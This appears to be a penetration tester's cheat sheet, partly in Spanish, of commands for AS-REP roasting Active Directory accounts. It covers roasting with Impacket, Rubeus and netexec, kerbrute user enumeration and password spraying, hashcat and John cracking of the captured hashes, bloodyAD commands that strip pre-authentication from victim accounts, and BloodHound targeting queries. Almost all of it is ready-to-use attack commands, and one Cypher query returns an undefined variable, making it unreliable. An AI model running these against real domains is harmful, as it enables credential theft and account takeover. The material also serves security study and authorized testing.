---
aliases:
  - AS-REP Tooling
  - GetNPUsers
  - Rubeus asreproast
  - kerbrute userenum
tags:
  - type/cheatsheet
  - technique/credential-access
  - technique/kerberos
  - asset/active-directory
  - cred/kerberos
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AS-REP Roasting]]"
  - "[[netexec]]"
  - "[[Impacket Toolkit]]"
---
# AS-REP Roasting - Tooling

***

## Impacket-GetNPUsers

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-GetNPUsers corp.local/ -dc-ip <DC> -usersfile users.txt -no-pass -format hashcat -outputfile h.txt` | Bulk unauth roast | Pre-foothold. |
| `impacket-GetNPUsers corp.local/u:p -dc-ip <DC> -request -outputfile h.txt` | Bulk auth roast | Post-foothold. |
| `impacket-GetNPUsers corp.local/u -hashes :<NT> -dc-ip <DC> -request` | PtH auth | Sin password. |
| `impacket-GetNPUsers corp.local/u -k -no-pass -dc-ip <DC> -request` | Kerberos auth | OPSEC. |
| `impacket-GetNPUsers corp.local/<single-user> -dc-ip <DC> -no-pass -request` | Single user | Targeted. |
| `impacket-GetNPUsers corp.local/u:p -target-domain partner.com -dc-ip <DC> -request` | Cross-domain | Cross-trust. |
^asrep-tool-impacket

___

## Rubeus

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt` | Bulk all (default) | Standard. |
| `Rubeus.exe asreproast /user:<single> /format:hashcat` | Single user | Targeted. |
| `Rubeus.exe asreproast /domain:partner.com /dc:<foreign-DC>` | Cross-domain | Cross-trust. |
| `Rubeus.exe asreproast /nowrap /format:hashcat` | No line wrap | Pipeline. |
| `Rubeus.exe asreproast /format:john /outfile:h.txt` | John format | Alt cracker. |
^asrep-tool-rubeus

___

## netexec / crackmapexec

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc ldap <DC> -u u -p p --asreproast asrep.hash` | Bulk auth | Quick. |
| `nxc ldap <DC> -u users.txt -p '' --asreproast asrep.hash` | Bulk unauth | Pre-foothold. |
| `nxc ldap <DC> -u u -H <NT> --asreproast asrep.hash` | PtH auth | Sin password. |
| `nxc ldap <DC> -u u -p p --asreproastable` | Solo enum (sin roast) | Discovery. |
^asrep-tool-nxc

___

## kerbrute

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `kerbrute userenum --dc <DC> -d corp.local users.txt` | Validate users + detect AS-REP inline | Pre-roast. |
| `kerbrute userenum --dc <DC> -d corp.local users.txt -o valid.txt -t 100` | Output + threads | Pipeline. |
| `kerbrute passwordspray --dc <DC> -d corp.local users.txt 'pwd'` | Spray (adjacent) | Post-validate. |
^asrep-tool-kerbrute

```bash
# Standard pipeline kerbrute first
kerbrute userenum --dc <DC> -d corp.local usernames.txt -o valid.txt

# Filter AS-REP-roastable inline
grep "AS-REP returned" valid.txt | awk '{print $5}' | sed 's/@.*//' > asrep_users.txt
```

___

## hashcat

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `hashcat -m 18200 asrep.hash rockyou.txt -O` | Standard wordlist | Default. |
| `hashcat -m 18200 asrep.hash rockyou.txt -r best64.rule -O` | + rules | Common. |
| `hashcat -m 18200 asrep.hash rockyou.txt -r OneRuleToRuleThemAll.rule -O` | Comprehensive | Hard targets. |
| `hashcat -m 18200 asrep.hash -a 3 ?u?l?l?l?l?l?d?d?s -O` | Mask | Targeted pattern. |
| `hashcat -m 18200 asrep.hash --show` | Show cracked | Post-run. |
^asrep-tool-hashcat

**Hashcat mode 18200** = Kerberos 5 AS-REP etype 23 (RC4-HMAC). Único mode (no AES variant — AS-REP roast standard RC4).

___

## John the Ripper

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `john --format=krb5asrep --wordlist=rockyou.txt asrep.hash` | Standard | Alt. |
| `john --format=krb5asrep asrep.hash --rules=Best64 --wordlist=rockyou.txt` | + rules | Comprehensive. |
| `john --format=krb5asrep --show asrep.hash` | Show cracked | Post-run. |
^asrep-tool-john

___

## bloodyAD (Linux)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `bloodyAD --host <DC> -d corp -u u -p pass set uac <victim> -f DONT_REQ_PREAUTH` | Set flag (targeted) | Privesc. |
| `bloodyAD --host <DC> -d corp -u u -p pass remove uac <victim> -f DONT_REQ_PREAUTH` | Clear flag | Cleanup. |
^asrep-tool-bloodyad

___

## BloodHound Custom Queries

| **Cypher** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `MATCH (u:User {dontreqpreauth:true, enabled:true}) RETURN u.name` | All AS-REP roastable | Standard. |
| `MATCH (u:User {dontreqpreauth:true}) WHERE u.adminCount = true RETURN u.name` | Priv | Critical hunt. |
| `MATCH (u {owned:true})-[:GenericAll\|GenericWrite\|WriteDacl\|WriteOwner]->(t:User) WHERE NOT t.dontreqpreauth RETURN p` | Targeted candidates | Targeted ACL. |
| `MATCH (u {owned:true})-[:WriteProperty]->(t:User) WHERE NOT t.dontreqpreauth RETURN u,t` | Specific WriteProperty | Targeted. |
^asrep-tool-bh

___

## Recursos

| **Recurso** | **URL** |
|:---:|:---:|
| HackTricks AS-REP Roasting | `https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast` |
| The Hacker Recipes — AS-REP | `https://www.thehacker.recipes/ad/movement/kerberos/asreproast` |
| HarmJ0y — Roasting AS-REPs | `https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/` |
| Rubeus | `https://github.com/GhostPack/Rubeus` |
| Impacket | `https://github.com/fortra/impacket` |
| kerbrute | `https://github.com/ropnop/kerbrute` |
| Hashcat modes reference | `https://hashcat.net/wiki/doku.php?id=example_hashes` |
| MITRE ATT&CK T1558.004 | `https://attack.mitre.org/techniques/T1558/004/` |
^asrep-tool-resources

***
